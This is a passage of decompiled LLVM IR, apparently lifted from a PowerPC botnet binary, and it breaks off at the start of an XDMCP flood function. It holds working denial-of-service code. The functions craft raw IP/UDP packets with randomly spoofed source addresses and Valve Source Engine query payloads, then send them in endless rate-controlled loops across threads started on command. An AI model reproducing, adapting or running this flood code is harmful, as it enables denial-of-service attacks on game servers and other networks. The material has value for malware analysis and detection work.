  uselistorder i32 %storemerge15, { 3, 0, 2, 1 }
  uselistorder i32 %v1_10005c74, { 1, 0 }
  uselistorder i32 %v1_10005be0, { 1, 0 }
  uselistorder i32 %v1_10005ba8, { 4, 3, 1, 2, 5, 0 }
  uselistorder i32 %v1_10005b20, { 1, 0 }
  uselistorder i32* %stack_var_-112, { 0, 1, 3, 2 }
  uselistorder i32 %tmp7, { 2, 1, 0 }
  uselistorder i32* %r9.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 12, 11, 13, 14, 15, 21, 16, 17, 18, 19, 20, 0, 22, 23, 24, 25, 26, 27, 28, 29 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_10005f34, { 1, 0 }
  uselistorder label %dec_label_pc_10005f1c, { 1, 0 }
  uselistorder label %dec_label_pc_10005f14, { 1, 0 }
  uselistorder label %dec_label_pc_10005ed0, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_10005d00, { 1, 0 }
  uselistorder label %dec_label_pc_10005b98, { 1, 0 }
  uselistorder label %dec_label_pc_10005b6c, { 1, 0 }
}

define i32 @setup_vse_ip_header(i32* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-72 = alloca i32, align 4
  %v1_10005f8c = call i32 @__asm_rlwimi(i32 5, i32 24, i32 4, i32 7)
  store i32 %v1_10005f8c, i32* %arg1, align 4
  %v1_10005fa0 = call i32 @__asm_rlwimi(i32 4, i32 28, i32 0, i32 3)
  store i32 %v1_10005fa0, i32* %arg1, align 4
  %v3_10005fb0 = add i32 %tmp, 1
  %v4_10005fb0 = inttoptr i32 %v3_10005fb0 to i8*
  store i8 0, i8* %v4_10005fb0, align 1
  %v3_10005fbc = add i32 %tmp, 2
  %v4_10005fbc = inttoptr i32 %v3_10005fbc to i16*
  store i16 53, i16* %v4_10005fbc, align 2
  store i32 54321, i32* @r3, align 4
  %v1_10005fc8 = call i32 @htonl(i32 54321)
  %v1_10005fd8 = trunc i32 %v1_10005fc8 to i16
  %v3_10005fd8 = add i32 %tmp, 4
  %v4_10005fd8 = inttoptr i32 %v3_10005fd8 to i16*
  store i16 %v1_10005fd8, i16* %v4_10005fd8, align 2
  %v3_10005fe4 = add i32 %tmp, 6
  %v4_10005fe4 = inttoptr i32 %v3_10005fe4 to i16*
  store i16 0, i16* %v4_10005fe4, align 2
  %v3_10005ff0 = add i32 %tmp, 8
  %v4_10005ff0 = inttoptr i32 %v3_10005ff0 to i8*
  store i8 -1, i8* %v4_10005ff0, align 1
  %v3_10005ffc = add i32 %tmp, 9
  %v4_10005ffc = inttoptr i32 %v3_10005ffc to i8*
  store i8 17, i8* %v4_10005ffc, align 1
  %v3_10006008 = add i32 %tmp, 10
  %v4_10006008 = inttoptr i32 %v3_10006008 to i16*
  store i16 0, i16* %v4_10006008, align 2
  store i32 268460056, i32* @lr, align 4
  %v2_10006014 = call i32 @realrand(i32 1, i32 255)
  store i32 268460072, i32* @lr, align 4
  %v2_10006024 = call i32 @realrand(i32 1, i32 255)
  store i32 268460088, i32* @lr, align 4
  %v2_10006034 = call i32 @realrand(i32 1, i32 255)
  store i32 268460104, i32* @lr, align 4
  %v2_10006044 = call i32 @realrand(i32 1, i32 255)
  %v2_1000604c = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_1000604c, i32* @r3, align 4
  store i32 16, i32* @r4, align 4
  store i32 ptrtoint ([12 x i8]* @global_var_1002abec.275 to i32), i32* @r5, align 4
  %v0_10006060 = load i32, i32* @r29, align 4
  %v0_10006064 = load i32, i32* @r28, align 4
  %v0_10006068 = load i32, i32* @r27, align 4
  store i32 268460152, i32* @lr, align 4
  %v9_10006074 = call i32 @__GI_snprintf(i32 %v2_1000604c, i32 16, i32 ptrtoint ([12 x i8]* @global_var_1002abec.275 to i32), i32 %v0_10006060, i32 %v0_10006064, i32 %v0_10006068, i32 %v2_10006044, i32 ptrtoint (i32* @0 to i32))
  store i32 268460164, i32* @lr, align 4
  %v1_10006080 = call i32 @inet_addr(i32 %v2_1000604c)
  %v2_1000608c = add i32 %tmp, 12
  %v3_1000608c = inttoptr i32 %v2_1000608c to i32*
  store i32 %v1_10006080, i32* %v3_1000608c, align 4
  ret i32 %v1_10006080

; uselistorder directives
  uselistorder i32 %v2_1000604c, { 1, 0, 2 }
}

define i32 @setup_vse_header(i16* %arg1) local_unnamed_addr {
entry:
  %r11.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  %stack_var_-48 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v4_100060b4 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v4_100060b4, i32* %stack_var_-48, align 4
  store i32 27015, i32* @r3, align 4
  %v1_100060d0 = call i32 @htons(i32 27015)
  %sext = mul i32 %v1_100060d0, 65536
  %v1_100060d4 = sdiv i32 %sext, 65536
  store i32 %tmp, i32* %r9.global-to-local, align 4
  %v1_100060dc = trunc i32 %v1_100060d4 to i16
  store i16 %v1_100060dc, i16* %arg1, align 2
  store i32 27015, i32* @r3, align 4
  %v1_100060e4 = call i32 @htons(i32 27015)
  %v1_100060f0 = trunc i32 %v1_100060e4 to i16
  %v3_100060f0 = add i32 %tmp, 2
  %v4_100060f0 = inttoptr i32 %v3_100060f0 to i16*
  store i16 %v1_100060f0, i16* %v4_100060f0, align 2
  %v3_100060fc = add i32 %tmp, 6
  %v4_100060fc = inttoptr i32 %v3_100060fc to i16*
  store i16 0, i16* %v4_100060fc, align 2
  %v1_10006104 = add i32 %tmp, 8
  %v2_10006114 = inttoptr i32 %v1_10006104 to i32*
  store i32 -1, i32* %v2_10006114, align 4
  %v1_1000611c = add i32 %tmp, 12
  store i32 %v1_1000611c, i32* %r11.global-to-local, align 4
  store i32 1919116576, i32* @r10, align 4
  store i32 1164863337, i32* @r8, align 4
  store i32 1852121169, i32* %r7.global-to-local, align 4
  %v2_1000613c = inttoptr i32 %v1_1000611c to i32*
  store i32 1414754165, i32* %v2_1000613c, align 4
  %v0_10006140 = load i32, i32* @r10, align 4
  %v1_10006140 = load i32, i32* %r11.global-to-local, align 4
  %v2_10006140 = add i32 %v1_10006140, 4
  %v3_10006140 = inttoptr i32 %v2_10006140 to i32*
  store i32 %v0_10006140, i32* %v3_10006140, align 4
  %v0_10006144 = load i32, i32* @r8, align 4
  %v1_10006144 = load i32, i32* %r11.global-to-local, align 4
  %v2_10006144 = add i32 %v1_10006144, 8
  %v3_10006144 = inttoptr i32 %v2_10006144 to i32*
  store i32 %v0_10006144, i32* %v3_10006144, align 4
  %v0_10006148 = load i32, i32* %r7.global-to-local, align 4
  %v1_10006148 = load i32, i32* %r11.global-to-local, align 4
  %v2_10006148 = add i32 %v1_10006148, 12
  %v3_10006148 = inttoptr i32 %v2_10006148 to i32*
  store i32 %v0_10006148, i32* %v3_10006148, align 4
  store i32 0, i32* %r9.global-to-local, align 4
  %v1_10006154 = load i32, i32* %r11.global-to-local, align 4
  %v2_10006154 = add i32 %v1_10006154, 16
  %v3_10006154 = inttoptr i32 %v2_10006154 to i32*
  store i32 1969582713, i32* %v3_10006154, align 4
  %v0_10006158 = load i32, i32* %r9.global-to-local, align 4
  %v1_10006158 = trunc i32 %v0_10006158 to i8
  %v2_10006158 = load i32, i32* %r11.global-to-local, align 4
  %v3_10006158 = add i32 %v2_10006158, 20
  %v4_10006158 = inttoptr i32 %v3_10006158 to i8*
  store i8 %v1_10006158, i8* %v4_10006158, align 1
  store i32 33, i32* @r3, align 4
  %v1_10006160 = call i32 @htons(i32 33)
  %v2_10006160 = trunc i32 %v1_10006160 to i16
  store i32 %tmp, i32* %r9.global-to-local, align 4
  %v3_1000616c = add i32 %tmp, 4
  %v4_1000616c = inttoptr i32 %v3_1000616c to i16*
  store i16 %v2_10006160, i16* %v4_1000616c, align 2
  %v2_10006170 = load i32, i32* %stack_var_-48, align 4
  store i32 %v2_10006170, i32* %r11.global-to-local, align 4
  ret i32 %v1_10006160

; uselistorder directives
  uselistorder i32 %tmp, { 1, 0, 3, 2, 4, 5, 6 }
  uselistorder i32 27015, { 0, 2, 1, 3 }
}

define i32 @vseflood(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-4148 = alloca i32, align 4
  %v2_100061ac = ptrtoint i32* %stack_var_-4148 to i32
  %v1_100061b8 = add i32 %v2_100061ac, 20
  store i32 2, i32* %stack_var_-52, align 4
  store i32 17015, i32* @r3, align 4
  %v1_100061cc = call i32 @htons(i32 17015)
  store i32 268460512, i32* @lr, align 4
  %v1_100061dc = call i32 @inet_addr(i32 %arg1)
  store i32 268460536, i32* @lr, align 4
  %v3_100061f4 = call i32 @socket(i32 2, i32 3, i32 17)
  %tmp22 = icmp sgt i32 %v3_100061f4, -1
  br i1 %tmp22, label %dec_label_pc_10006214, label %dec_label_pc_1000620c

dec_label_pc_1000620c:                            ; preds = %entry
  %v0_10006210 = call i32 @__GI_exit()
  br label %dec_label_pc_10006214

dec_label_pc_10006214:                            ; preds = %entry, %dec_label_pc_1000620c
  store i32 %v2_100061ac, i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  store i32 4096, i32* @r5, align 4
  store i32 268460588, i32* @lr, align 4
  %v0_10006228 = call i32 @__GI_memset()
  store i32 268460596, i32* @lr, align 4
  %v2_10006230 = call i32 @setup_vse_ip_header(i32* nonnull %stack_var_-4148)
  store i32 268460604, i32* @lr, align 4
  %v1_10006238 = inttoptr i32 %v1_100061b8 to i16*
  %v2_10006238 = call i32 @setup_vse_header(i16* %v1_10006238)
  %v2_10006244 = add i32 %v2_100061ac, 16
  %v3_10006244 = inttoptr i32 %v2_10006244 to i32*
  store i32 %v1_100061dc, i32* %v3_10006244, align 4
  %v1_10006250 = or i32 %v2_100061ac, 2
  %v2_10006250 = inttoptr i32 %v1_10006250 to i16*
  %v3_10006250 = load i16, i16* %v2_10006250, align 2
  %v4_10006250 = zext i16 %v3_10006250 to i32
  %v2_10006260 = bitcast i32* %stack_var_-4148 to i16*
  %v3_10006260 = call i32 @csum(i16* %v2_10006260, i32 %v4_10006250)
  %v1_1000626c = trunc i32 %v3_10006260 to i16
  %v3_1000626c = add i32 %v2_100061ac, 10
  %v4_1000626c = inttoptr i32 %v3_1000626c to i16*
  store i16 %v1_1000626c, i16* %v4_1000626c, align 2
  store i32 1, i32* %stack_var_-36, align 4
  %v2_10006278 = ptrtoint i32* %stack_var_-36 to i32
  store i32 268460696, i32* @lr, align 4
  %v5_10006294 = call i32 @__GI_setsockopt(i32 %v3_100061f4, i32 0, i32 3, i32 %v2_10006278, i32 4)
  %tmp23 = icmp sgt i32 %v5_10006294, -1
  br i1 %tmp23, label %dec_label_pc_100062ac, label %dec_label_pc_100062a4

dec_label_pc_100062a4:                            ; preds = %dec_label_pc_10006214
  %v0_100062a8 = call i32 @__GI_exit()
  br label %dec_label_pc_100062ac

dec_label_pc_100062ac:                            ; preds = %dec_label_pc_10006214, %dec_label_pc_100062a4
  store i32 268460724, i32* @lr, align 4
  %v1_100062b0 = call i32 @__GI_time(i32 0)
  %v1_100062bc = call i32 @init_rand(i32 %v1_100062b0)
  %v2_100062d8 = ptrtoint i32* %stack_var_-52 to i32
  %v2_10006354 = add i32 %v2_100061ac, 12
  %v3_10006354 = inttoptr i32 %v2_10006354 to i32*
  %v3_10006374 = add i32 %v2_100061ac, 4
  %v4_10006374 = inttoptr i32 %v3_10006374 to i16*
  br label %dec_label_pc_100062c8

dec_label_pc_100062c8:                            ; preds = %dec_label_pc_100063e0, %dec_label_pc_100062ac
  %storemerge3 = phi i32 [ 0, %dec_label_pc_100062ac ], [ %v1_100063e4, %dec_label_pc_100063e0 ]
  %v3_100062cc = load i16, i16* %v2_10006250, align 2
  %v4_100062cc = zext i16 %v3_100062cc to i32
  store i32 268460796, i32* @lr, align 4
  %v6_100062f8 = call i32 @sendto(i32 %v3_100061f4, i32 %v2_100061ac, i32 %v4_100062cc, i32 0, i32 %v2_100062d8, i32 16)
  %v0_100062fc = call i32 @rand_cmwc()
  %v1_10006304 = urem i32 %v0_100062fc, 16777216
  %v1_1000630c = sub i32 %v0_100062fc, %v1_10006304
  %v0_10006310 = call i32 @rand_cmwc()
  %v1_1000631c = and i32 %v0_10006310, 16711680
  %v2_10006324 = or i32 %v1_1000630c, %v1_1000631c
  %v0_10006328 = call i32 @rand_cmwc()
  %v1_10006334 = and i32 %v0_10006328, 65280
  %v2_1000633c = or i32 %v2_10006324, %v1_10006334
  %v0_10006340 = call i32 @rand_cmwc()
  %v1_10006348 = urem i32 %v0_10006340, 256
  %v2_1000634c = or i32 %v2_1000633c, %v1_10006348
  store i32 %v2_1000634c, i32* %v3_10006354, align 4
  %v0_10006358 = call i32 @rand_cmwc()
  store i32 %v0_10006358, i32* @r3, align 4
  %v1_10006364 = call i32 @htonl(i32 %v0_10006358)
  %v1_10006374 = trunc i32 %v1_10006364 to i16
  store i16 %v1_10006374, i16* %v4_10006374, align 4
  %v3_10006380 = load i16, i16* %v2_10006250, align 2
  %v4_10006380 = zext i16 %v3_10006380 to i32
  %v3_10006390 = call i32 @csum(i16* %v2_10006260, i32 %v4_10006380)
  %v1_1000639c = trunc i32 %v3_10006390 to i16
  store i16 %v1_1000639c, i16* %v4_1000626c, align 2
  %v3_100063a4 = load i32, i32* @global_var_1004518c.119, align 4
  %v1_100063a8 = add i32 %v3_100063a4, 1
  store i32 %v1_100063a8, i32* @global_var_1004518c.119, align 4
  %v3_100063b8 = load i32, i32* @global_var_10045174.120, align 4
  %v3_100063c0 = icmp ugt i32 %v3_100063b8, %storemerge3
  br i1 %v3_100063c0, label %dec_label_pc_100063e0, label %dec_label_pc_100063c8

dec_label_pc_100063c8:                            ; preds = %dec_label_pc_100062c8
  %v3_100063d4 = load i32, i32* @global_var_100450b4.121, align 4
  store i32 268461024, i32* @lr, align 4
  %v1_100063dc = call i32 @usleep(i32 %v3_100063d4)
  br label %dec_label_pc_100063e0

dec_label_pc_100063e0:                            ; preds = %dec_label_pc_100062c8, %dec_label_pc_100063c8
  %stack_var_-20.0 = phi i32 [ %storemerge3, %dec_label_pc_100062c8 ], [ 0, %dec_label_pc_100063c8 ]
  %v1_100063e4 = add i32 %stack_var_-20.0, 1
  br label %dec_label_pc_100062c8

; uselistorder directives
  uselistorder i32 %v2_100061ac, { 5, 1, 2, 3, 0, 4, 6, 7 }
  uselistorder i32* %stack_var_-4148, { 1, 0, 2 }
  uselistorder i32* %stack_var_-36, { 1, 0 }
  uselistorder i32* %stack_var_-52, { 1, 0 }
  uselistorder i32 17015, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_100063e0, { 1, 0 }
  uselistorder label %dec_label_pc_100062ac, { 1, 0 }
  uselistorder label %dec_label_pc_10006214, { 1, 0 }
}

define i32 @vset(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-96 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v4_100063f0 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v4_100063f0, i32* %stack_var_-96, align 4
  store i32 268461092, i32* @lr, align 4
  %v1_10006420 = call i32 @__GI_time(i32 0)
  %v1_10006430 = call i32 @mfork(i32 %arg2)
  %v3_10006438 = icmp eq i32 %v1_10006430, 0
  br i1 %v3_10006438, label %dec_label_pc_10006440, label %dec_label_pc_1000672c

dec_label_pc_10006440:                            ; preds = %entry
  store i32 268461136, i32* @lr, align 4
  %v3_1000644c = call i32 @socket(i32 2, i32 3, i32 255)
  %tmp26 = icmp sgt i32 %v3_1000644c, -1
  br i1 %tmp26, label %dec_label_pc_1000646c, label %dec_label_pc_10006464

dec_label_pc_10006464:                            ; preds = %dec_label_pc_10006440
  %v0_10006468 = call i32 @__GI_exit()
  br label %dec_label_pc_1000646c

dec_label_pc_1000646c:                            ; preds = %dec_label_pc_10006440, %dec_label_pc_10006464
  %v2_10006470 = icmp sgt i32 %arg3, 3
  br i1 %v2_10006470, label %dec_label_pc_10006498, label %dec_label_pc_10006478

dec_label_pc_10006478:                            ; preds = %dec_label_pc_1000646c
  %v6_1000648c = call i32 @Send(i32 %arg1, i32 ptrtoint ([90 x i8]* @global_var_1002ac98.297 to i32), i32 %arg2, i32 ptrtoint ([13 x i8]* @global_var_10030000.14 to i32))
  %v0_10006494 = call i32 @__GI_exit()
  br label %dec_label_pc_10006498

dec_label_pc_10006498:                            ; preds = %dec_label_pc_1000646c, %dec_label_pc_10006478
  %v1_1000649c = add i32 %arg4, 8
  %v1_100064a0 = inttoptr i32 %v1_1000649c to i32*
  %v2_100064a0 = load i32, i32* %v1_100064a0, align 4
  store i32 268461228, i32* @lr, align 4
  %v1_100064a8 = call i32 @atol(i32 %v2_100064a0)
  %v1_100064b8 = add i32 %arg4, 12
  %v1_100064bc = inttoptr i32 %v1_100064b8 to i32*
  %v2_100064bc = load i32, i32* %v1_100064bc, align 4
  store i32 268461256, i32* @lr, align 4
  %v1_100064c4 = call i32 @atol(i32 %v2_100064bc)
  %v1_100064d4 = add i32 %arg4, 16
  %v1_100064d8 = inttoptr i32 %v1_100064d4 to i32*
  %v2_100064d8 = load i32, i32* %v1_100064d8, align 4
  store i32 268461284, i32* @lr, align 4
  %v1_100064e0 = call i32 @atol(i32 %v2_100064d8)
  store i32 0, i32* @global_var_10045174.120, align 4
  store i32 0, i32* @global_var_1004518c.119, align 4
  %v1_10006508 = mul i32 %v1_100064a8, 4
  %v1_10006510 = add i32 %v1_10006508, 30
  %v1_10006514 = and i32 %v1_10006510, -16
  %v2_1000651c = load i32, i32* %stack_var_-96, align 4
  %v1_10006524 = load i32, i32* @r1, align 4
  %v3_10006524 = sub i32 %v1_10006524, %v1_10006514
  %v4_10006524 = inttoptr i32 %v3_10006524 to i32*
  store i32 %v2_1000651c, i32* %v4_10006524, align 4
  %v1_10006534 = add i32 %v3_10006524, 23
  %v1_10006538 = and i32 %v1_10006534, -16
  %v2_100065a82 = icmp sgt i32 %v1_100064a8, 0
  %v1_10006574 = add i32 %arg4, 4
  %v1_10006578 = inttoptr i32 %v1_10006574 to i32*
  br i1 %v2_100065a82, label %dec_label_pc_10006560, label %dec_label_pc_100065b0

dec_label_pc_10006560:                            ; preds = %dec_label_pc_10006498, %dec_label_pc_10006560
  %storemerge15 = phi i32 [ %v1_10006598, %dec_label_pc_10006560 ], [ 0, %dec_label_pc_10006498 ]
  %v1_10006568 = mul i32 %storemerge15, 4
  %v2_1000656c = add i32 %v1_10006568, %v1_10006538
  %v2_10006578 = load i32, i32* %v1_10006578, align 4
  store i32 268461460, i32* @lr, align 4
  %v5_10006590 = load i32, i32* @r8, align 4
  %v6_10006590 = inttoptr i32 %v2_1000656c to i32*
  %v7_10006590 = call i32 @pthread_create(i32* %v6_10006590, i32 0, i32 268460424, i32 %v2_10006578, i32 268435456, i32 %v5_10006590)
  %v1_10006598 = add nuw nsw i32 %storemerge15, 1
  %v2_100065a8 = icmp slt i32 %v1_10006598, %v1_100064a8
  br i1 %v2_100065a8, label %dec_label_pc_10006560, label %dec_label_pc_100065b0

dec_label_pc_100065b0:                            ; preds = %dec_label_pc_10006560, %dec_label_pc_10006498
  %v2_100065b8 = load i32, i32* %v1_10006578, align 4
  %v6_100065d4 = call i32 @Send(i32 %arg1, i32 ptrtoint ([29 x i8]* @global_var_1002acf4.298 to i32), i32 %arg2, i32 %v2_100065b8)
  %v2_100065e8 = load i32, i32* %v1_100064d8, align 4
  store i32 268461556, i32* @lr, align 4
  %v1_100065f0 = call i32 @atol(i32 %v2_100065e8)
  %v2_100065fc = mul i32 %v1_100065f0, 20
  %v3_10006604 = icmp sgt i32 %v2_100065fc, 0
  br i1 %v3_10006604, label %dec_label_pc_1000660c, label %dec_label_pc_10006724

dec_label_pc_1000660c:                            ; preds = %dec_label_pc_100065b0
  store i32 268461604, i32* @lr, align 4
  %v1_10006620 = call i32 @usleep(i32 50000)
  %v3_10006628 = load i32, i32* @global_var_1004518c.119, align 4
  %v2_10006630 = mul i32 %v3_10006628, 20
  %v3_10006638 = icmp ugt i32 %v2_10006630, %v1_100064c4
  %v3_10006644 = load i32, i32* @global_var_10045174.120, align 4
  br i1 %v3_10006638, label %dec_label_pc_10006640, label %dec_label_pc_10006680

dec_label_pc_10006640:                            ; preds = %dec_label_pc_1000660c
  %v2_10006648 = icmp sgt i32 %v3_10006644, 0
  br i1 %v2_10006648, label %dec_label_pc_10006668, label %dec_label_pc_10006650

dec_label_pc_10006650:                            ; preds = %dec_label_pc_10006640
  %v3_10006654 = load i32, i32* @global_var_100450b4.121, align 4
  %v1_10006658 = add i32 %v3_10006654, 100
  store i32 %v1_10006658, i32* @global_var_100450b4.121, align 4
  br label %dec_label_pc_100066c8

dec_label_pc_10006668:                            ; preds = %dec_label_pc_10006640
  %v1_10006670 = add i32 %v3_10006644, -1
  store i32 %v1_10006670, i32* @global_var_10045174.120, align 4
  br label %dec_label_pc_100066c8

dec_label_pc_10006680:                            ; preds = %dec_label_pc_1000660c
  %v1_10006688 = add i32 %v3_10006644, 1
  store i32 %v1_10006688, i32* @global_var_10045174.120, align 4
  %v3_10006698 = load i32, i32* @global_var_100450b4.121, align 4
  %tmp27 = icmp ult i32 %v3_10006698, 26
  br i1 %tmp27, label %dec_label_pc_100066bc, label %dec_label_pc_100066a4

dec_label_pc_100066a4:                            ; preds = %dec_label_pc_10006680
  %v1_100066ac = add i32 %v3_10006698, -25
  store i32 %v1_100066ac, i32* @global_var_100450b4.121, align 4
  br label %dec_label_pc_100066c8

dec_label_pc_100066bc:                            ; preds = %dec_label_pc_10006680
  store i32 0, i32* @global_var_100450b4.121, align 4
  br label %dec_label_pc_100066c8

dec_label_pc_100066c8:                            ; preds = %dec_label_pc_100066a4, %dec_label_pc_10006668, %dec_label_pc_10006650, %dec_label_pc_100066bc
  store i32 0, i32* @global_var_1004518c.119, align 4
  %v2_100066f8 = add i32 %v1_100064e0, %v1_10006420
  br label %dec_label_pc_100066d4

dec_label_pc_100066d4:                            ; preds = %dec_label_pc_10006714, %dec_label_pc_100066c8
  %stack_var_-84.0 = phi i32 [ %tmp, %dec_label_pc_100066c8 ], [ %v1_10006718, %dec_label_pc_10006714 ]
  %tmp28 = icmp slt i32 %stack_var_-84.0, 100
  br i1 %tmp28, label %dec_label_pc_10006714, label %dec_label_pc_100066e0

dec_label_pc_100066e0:                            ; preds = %dec_label_pc_100066d4
  store i32 268461800, i32* @lr, align 4
  %v1_100066e4 = call i32 @__GI_time(i32 0)
  %v2_100066fc = icmp ult i32 %v1_100066e4, %v2_100066f8
  br i1 %v2_100066fc, label %dec_label_pc_1000670c, label %dec_label_pc_10006704

dec_label_pc_10006704:                            ; preds = %dec_label_pc_100066e0
  %v0_10006708 = call i32 @__GI_exit()
  br label %dec_label_pc_1000670c

dec_label_pc_1000670c:                            ; preds = %dec_label_pc_100066e0, %dec_label_pc_10006704
  br label %dec_label_pc_10006714

dec_label_pc_10006714:                            ; preds = %dec_label_pc_100066d4, %dec_label_pc_1000670c
  %stack_var_-84.1 = phi i32 [ %stack_var_-84.0, %dec_label_pc_100066d4 ], [ 0, %dec_label_pc_1000670c ]
  %v1_10006718 = add i32 %stack_var_-84.1, 1
  br label %dec_label_pc_100066d4

dec_label_pc_10006724:                            ; preds = %dec_label_pc_100065b0
  %v0_10006728 = call i32 @__GI_exit()
  br label %dec_label_pc_1000672c

dec_label_pc_1000672c:                            ; preds = %entry, %dec_label_pc_10006724
  %v0_10006750 = phi i32 [ %v1_10006430, %entry ], [ %v0_10006728, %dec_label_pc_10006724 ]
  ret i32 %v0_10006750

; uselistorder directives
  uselistorder i32 %v3_10006644, { 1, 0, 2 }
  uselistorder i32 %v1_10006598, { 1, 0 }
  uselistorder i32 %storemerge15, { 1, 0 }
  uselistorder i32 %v1_100064a8, { 2, 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_1000672c, { 1, 0 }
  uselistorder label %dec_label_pc_10006714, { 1, 0 }
  uselistorder label %dec_label_pc_1000670c, { 1, 0 }
  uselistorder label %dec_label_pc_100066c8, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_10006560, { 1, 0 }
  uselistorder label %dec_label_pc_10006498, { 1, 0 }
  uselistorder label %dec_label_pc_1000646c, { 1, 0 }
}

define i32 @setup_xdmcp_ip_header(i32* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  %v1_10006778 = call i32 @__asm_rlwimi(i32 5, i32 24, i32 4, i32 7)
  store i32 %v1_10006778, i32* %arg1, align 4
  %v1_1000678c = call i32 @__asm_rlwimi(i32 4, i32 28, i32 0, i32 3)
  store i32 %v1_1000678c, i32* %arg1, align 4
  %v3_1000679c = add i32 %tmp, 1
  %v4_1000679c = inttoptr i32 %v3_1000679c to i8*
  store i8 0, i8* %v4_1000679c, align 1
  %v3_100067a8 = add i32 %tmp, 2
  %v4_100067a8 = inttoptr i32 %v3_100067a8 to i16*
  store i16 35, i16* %v4_100067a8, align 2
  store i32 54321, i32* @r3, align 4
  %v1_100067b4 = call i32 @htonl(i32 54321)
  %v1_100067c4 = trunc i32 %v1_100067b4 to i16
  %v3_100067c4 = add i32 %tmp, 4
  %v4_100067c4 = inttoptr i32 %v3_100067c4 to i16*
  store i16 %v1_100067c4, i16* %v4_100067c4, align 2
  %v3_100067d0 = add i32 %tmp, 6
  %v4_100067d0 = inttoptr i32 %v3_100067d0 to i16*
  store i16 0, i16* %v4_100067d0, align 2
  %v3_100067dc = add i32 %tmp, 8
  %v4_100067dc = inttoptr i32 %v3_100067dc to i8*
  store i8 -1, i8* %v4_100067dc, align 1
  %v3_100067e8 = add i32 %tmp, 9
  %v4_100067e8 = inttoptr i32 %v3_100067e8 to i8*
  store i8 17, i8* %v4_100067e8, align 1
  %v3_100067f4 = add i32 %tmp, 10
  %v4_100067f4 = inttoptr i32 %v3_100067f4 to i16*
  store i16 0, i16* %v4_100067f4, align 2
  store i32 268462084, i32* @lr, align 4
  %v2_10006800 = call i32 @inet_addr(i32 ptrtoint ([14 x i8]* @global_var_1002a5b8.100 to i32))
  %v2_1000680c = add i32 %tmp, 12
  %v3_1000680c = inttoptr i32 %v2_1000680c to i32*
  store i32 %v2_10006800, i32* %v3_1000680c, align 4
  ret i32 %v2_10006800
}

define i32 @setup_xdmcp_udp_header(i16* %arg1) local_unnamed_addr {
entry:
  %r11.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  %stack_var_-32 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v4_10006828 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v4_10006828, i32* %stack_var_-32, align 4
  store i32 5678, i32* @r3, align 4
  %v1_10006844 = call i32 @htons(i32 5678)
  %sext = mul i32 %v1_10006844, 65536
  %v1_10006848 = sdiv i32 %sext, 65536
  store i32 %tmp, i32* %r9.global-to-local, align 4
  %v1_10006850 = trunc i32 %v1_10006848 to i16
  store i16 %v1_10006850, i16* %arg1, align 2
  store i32 177, i32* @r3, align 4
  %v1_10006858 = call i32 @htons(i32 177)
  %v1_10006864 = trunc i32 %v1_10006858 to i16
  %v3_10006864 = add i32 %tmp, 2
  %v4_10006864 = inttoptr i32 %v3_10006864 to i16*
  store i16 %v1_10006864, i16* %v4_10006864, align 2
  %v3_10006870 = add i32 %tmp, 6
  %v4_10006870 = inttoptr i32 %v3_10006870 to i16*
  store i16 0, i16* %v4_10006870, align 2
  %v1_10006878 = add i32 %tmp, 8
  store i32 %v1_10006878, i32* %r11.global-to-local, align 4
  store i32 1, i32* @r10, align 4
  store i32 0, i32* %r9.global-to-local, align 4
  %v2_10006890 = inttoptr i32 %v1_10006878 to i32*
  store i32 65538, i32* %v2_10006890, align 4
  %v0_10006894 = load i32, i32* @r10, align 4
  %v1_10006894 = trunc i32 %v0_10006894 to i16
  %v2_10006894 = load i32, i32* %r11.global-to-local, align 4
  %v3_10006894 = add i32 %v2_10006894, 4
  %v4_10006894 = inttoptr i32 %v3_10006894 to i16*
  store i16 %v1_10006894, i16* %v4_10006894, align 2
  %v0_10006898 = load i32, i32* %r9.global-to-local, align 4
  %v1_10006898 = trunc i32 %v0_10006898 to i8
  %v2_10006898 = load i32, i32* %r11.global-to-local, align 4
  %v3_10006898 = add i32 %v2_10006898, 6
  %v4_10006898 = inttoptr i32 %v3_10006898 to i8*
  store i8 %v1_10006898, i8* %v4_10006898, align 1
  store i32 15, i32* @r3, align 4
  %v1_100068a0 = call i32 @htons(i32 15)
  %v2_100068a0 = trunc i32 %v1_100068a0 to i16
  store i32 %tmp, i32* %r9.global-to-local, align 4
  %v3_100068ac = add i32 %tmp, 4
  %v4_100068ac = inttoptr i32 %v3_100068ac to i16*
  store i16 %v2_100068a0, i16* %v4_100068ac, align 2
  %v2_100068b0 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_100068b0, i32* %r11.global-to-local, align 4
  ret i32 %v1_100068a0

; uselistorder directives
  uselistorder i32 %tmp, { 1, 0, 2, 3, 4, 5 }
}

define i32 @xdmcpflood(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-4144 = alloca i32, align 4
  %v2_100068e8 = ptrtoint i32* %stack_var_-4144 to i32
  %v1_100068f4 = add i32 %v2_100068e8, 20
